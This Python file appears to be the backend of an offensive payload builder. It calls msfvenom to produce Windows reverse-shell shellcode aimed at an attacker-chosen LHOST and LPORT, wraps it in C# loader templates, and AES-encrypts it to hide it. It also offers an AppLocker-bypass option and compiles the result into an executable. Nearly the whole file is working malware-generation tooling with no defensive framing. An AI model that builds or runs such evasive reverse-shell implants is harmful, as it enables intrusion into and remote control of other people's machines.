import os, re, subprocess, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# --- SHELLCODE GENERATION BACKEND ---
def generate_shellcode_backend(selected_format, arch, payload, connection, interface, port, template):
    if not port.isdigit():
        raise ValueError("Invalid port number.")

    command = f"msfvenom -p windows/{'x64/' if arch == 'x64' else ''}{payload}/reverse_{connection} LHOST={interface} LPORT={port} -f {selected_format}"
    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)

    if selected_format == "csharp":
        shellcode_data = [line.strip() for line in result.split("\n") if "0x" in line]
        shellcode_bytes = re.findall(r"0x[0-9a-fA-F]+", "\n".join(shellcode_data))
        shellcode_formatted = ", ".join(shellcode_bytes)
        shellcode_only = [f"{x}" for x in shellcode_bytes]
        shellcode_only = ",\n".join(", ".join(shellcode_only[i:i+8]) for i in range(0, len(shellcode_only), 8))
    else:
        raise ValueError("Unsupported format selected.")

    wrapped_shellcode = f"byte[] buf = new byte[] {{\n        {shellcode_formatted}\n    }};"
    directives = "\n".join(template.get("directives", []))
    function_decls = "\n    ".join(template.get("function_declarations", []))
    code_blocks = template.get("code_blocks", {})

    all_code_lines = []
    for key, block in code_blocks.items():
        all_code_lines.append(f"    // --- {key.replace('_', ' ').title()} ---")
        all_code_lines.extend(f"    {line}" for line in block)
        all_code_lines.append("")

    main_code = "\n".join(all_code_lines).replace("PLACEHOLDER_SHELLCODE", wrapped_shellcode)
    constant_decls = "\n    ".join(template.get("constant_declarations", []))

    main_signature = "static void Main()"
    if any("args[0]" in line or "args.Length" in line for block in code_blocks.values() for line in block):
        main_signature = "static void Main(string[] args)"

    final_script = f"""
{directives}
class Program
{{
    {function_decls}
    {constant_decls}
    {main_signature}
    {{
{main_code}
    }}
}}
"""
    return final_script.strip(), shellcode_only, wrapped_shellcode

# --- FINAL SCRIPT BUILDER ---
def build_final_script(template, shellcode=None, aes_data=None):

    # --- AES ENCRYPTION (auto) ---
    if aes_data is None and shellcode:
        try:
            raw_bytes = bytes(int(x, 16) for x in re.findall(r"0x[0-9a-fA-F]+", shellcode))
            key = os.urandom(16)
            iv = os.urandom(16)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            encrypted = cipher.encrypt(pad(raw_bytes, AES.block_size))
            aes_data = {
                "b64_shellcode": base64.b64encode(encrypted).decode(),
                "b64_key": base64.b64encode(key).decode(),
                "b64_iv": base64.b64encode(iv).decode()
            }
        except Exception as e:
            raise ValueError(f"Failed to encrypt shellcode: {e}")

    # --- BUILDING TEMPLATE ---
    directives = "\n".join(template.get("directives", []))
    function_decls = "\n    ".join(template.get("function_declarations", []))
    constants = "\n    ".join(template.get("constant_declarations", []))
    definitions = "\n    ".join(template.get("function_definitions", [])) if "function_definitions" in template else ""

    code_blocks = template.get("code_blocks", {})
    code_lines = []

    for key, block in code_blocks.items():
        code_lines.append(f"    // --- {key.replace('_', ' ').title()} ---")
        code_lines.extend(f"    {line}" for line in block)
        code_lines.append("")

    code = "\n".join(code_lines)

    # Inject AES values or fallback to plain shellcode
    if aes_data:
        code = code.replace("ENCRYPTED_SHELLCODE_B64", aes_data["b64_shellcode"])
        code = code.replace("AES_KEY_B64", aes_data["b64_key"])
        code = code.replace("AES_IV_B64", aes_data["b64_iv"])
    elif shellcode:
        code = code.replace("PLACEHOLDER_SHELLCODE", shellcode)

    main_signature = "static void Main()"
    if any("args" in line for block in code_blocks.values() for line in block):
        main_signature = "static void Main(string[] args)"

    final_script = f"""
    {directives}

    class Program
    {{
        {function_decls}
        {constants}
        {main_signature}
        {{
    {code}
        }}
        {definitions}
    }}"""

    return final_script.strip()

# --- EXE BUILDER ---
def build_exe_from_output(app):
    full_output = app.output_text.get("1.0", "end").strip()
    if not full_output:
        app.output_text.configure(state="normal")
        app.output_text.insert("end", "\n[!] No C# code to compile.\n")
        app.output_text.configure(state="disabled")
        return

    technique = app.selected_technique.get().lower().replace(" ", "_")

    fmt = app.selected_format.get().lower()
    arch = app.architecture.get().lower()
    payload = app.payload_type.get().lower()
    connection = app.selected_connection.get().lower()
    interface = app.selected_interface.get().lower().replace("/", "_")
    port = app.port.get()

    # Check if AppLocker bypass is enabled and append to filename
    applocker_suffix = ""
    if hasattr(app, 'applocker_var') and app.applocker_var.get():
        applocker_suffix = "_applocker"

    filename = f"{technique}_{fmt}_{arch}_{payload}_{connection}_{interface}_{port}{applocker_suffix}.exe"

    try:
        build_exe(full_output, filename, arch=arch)
        app.top_status_label.config(text="EXE Built!", foreground="#00ff00")
        app.bottom_status_label.config(text="see output", foreground="#00ff00")
        app.flicker_widget(app.top_status_label, "#00ff00", "#2e2e2e", final_color="#00ff00")
        app.open_folder_button.pack(pady=5, padx=10, anchor="se")
        app.flicker_widget(app.open_folder_button, "#91ddd3", "#ec1c3a", final_color="#91ddd3")
    except subprocess.CalledProcessError:
        app.top_status_label.config(text="Build failed", foreground="#ff5555")
        app.flicker_widget(app.top_status_label, "#ff0000", "#1f1f1f", steps=4, interval=60, final_color="#ec1c3a")

# --- C# EXE COMPILER ---
def build_exe(source_code, filename, output_dir="output", arch="x64"):
    os.makedirs(output_dir, exist_ok=True)
    source_path = os.path.join(output_dir, filename.replace(".exe", ".cs"))
    exe_path = os.path.join(output_dir, filename)

    with open(source_path, "w") as f:
        f.write(source_code)

    compile_cmd = f'mcs -out:"{exe_path}" -platform:{arch} -unsafe -target:exe -reference:System.dll,System.Core.dll,System.Security.dll,System.Configuration.Install.dll "{source_path}"'
    print(f"Running: {compile_cmd}")

    try:
        output = subprocess.check_output(compile_cmd, shell=True, stderr=subprocess.STDOUT, text=True)
        print("[+] Compilation Output:\n", output)
        return exe_path
    except subprocess.CalledProcessError as e:
        print("\n[!] Compiler Error Output:\n", e.output)
        raise e